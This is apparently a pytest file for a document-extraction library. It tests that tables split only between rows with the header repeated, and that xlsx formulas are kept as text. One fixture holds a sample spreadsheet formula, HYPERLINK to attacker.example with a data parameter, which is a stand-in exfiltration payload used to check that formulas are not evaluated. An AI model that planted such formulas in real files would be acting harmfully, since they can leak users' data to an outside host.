"""A table splits only between rows, and every piece repeats the header row."""
from __future__ import annotations

from agent_friday.services.library import extract, structure


def test_csv_rows_never_split_and_every_piece_repeats_the_header(tmp_path):
    rows = ["name,amount,note"] + [f"vendor {i},{i * 100},paid in full on invoice {i}" for i in range(300)]
    p = tmp_path / "ledger.csv"
    p.write_text("\n".join(rows), encoding="utf-8")
    res = extract.extract_document(p)
    assert len(res["blocks"]) > 1
    header = "name | amount | note"
    got = []
    for b in res["blocks"]:
        lines = b["text"].split("\n")
        assert lines[0] == header
        got += lines[1:]
    assert got == [r.replace(",", " | ") for r in rows[1:]]


def test_passages_of_a_long_table_split_between_rows_with_the_header(tmp_path):
    lines = ["h1 | h2"] + [f"row {i} | " + "x" * 60 for i in range(80)]
    block = {"kind": "table", "text": "\n".join(lines), "header": "h1 | h2", "ord": 0, "page": None}
    sec = {"blocks": [block]}
    passages = structure.build_passages(sec)
    assert len(passages) > 1
    for pa in passages:
        assert pa["text"].split("\n")[0] == "h1 | h2"
        assert pa["chars"] <= structure.PASSAGE_MAX_CHARS
        for ln in pa["text"].split("\n")[1:]:
            assert ln in lines


def test_xlsx_formula_cells_are_text_not_evaluated(tmp_path):
    import zipfile
    p = tmp_path / "s.xlsx"
    sheet = ('<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
             '<row r="1"><c r="A1" t="inlineStr"><is><t>link</t></is></c></row>'
             '<row r="2"><c r="A2"><f>HYPERLINK("http://attacker.example/?d=1","x")</f></c></row>'
             '</sheetData></worksheet>')
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("xl/worksheets/sheet1.xml", sheet)
    res = extract.extract_document(p)
    assert '=HYPERLINK("http://attacker.example/?d=1","x")' in res["blocks"][0]["text"]
